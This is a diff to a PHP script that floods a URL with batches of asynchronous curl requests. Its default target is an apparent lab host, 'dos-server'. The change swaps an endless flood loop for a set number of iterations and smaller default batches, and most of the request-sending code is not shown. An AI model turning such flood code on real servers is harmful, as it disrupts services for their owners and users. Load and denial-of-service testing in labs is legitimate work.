@@ -3,7 +3,8 @@
 <?php
 
 $url = (string)($argv[1] ?? 'http://dos-server');
-$requestsCount = (int)($argv[2] ?? 1000);
+$requestsBatchCount = (int)($argv[2] ?? 100);
+$iterations = (int)($argv[3] ?? 10);
 
 function sendAsyncRequests(string $url, int $requestsCount) {
     echo "Start flood for {$url} with {$requestsCount} async request" . PHP_EOL;
@@ -46,8 +47,11 @@ function sendAsyncRequests(string $url, int $requestsCount) {
     curl_multi_close($multi);
 }
 
-while (true) {
-    sendAsyncRequests($url, $requestsCount);
+$i = 0;
+
+while ($i < $iterations) {
+    sendAsyncRequests($url, $requestsBatchCount);
+    $i++;
 }
 
 ?>
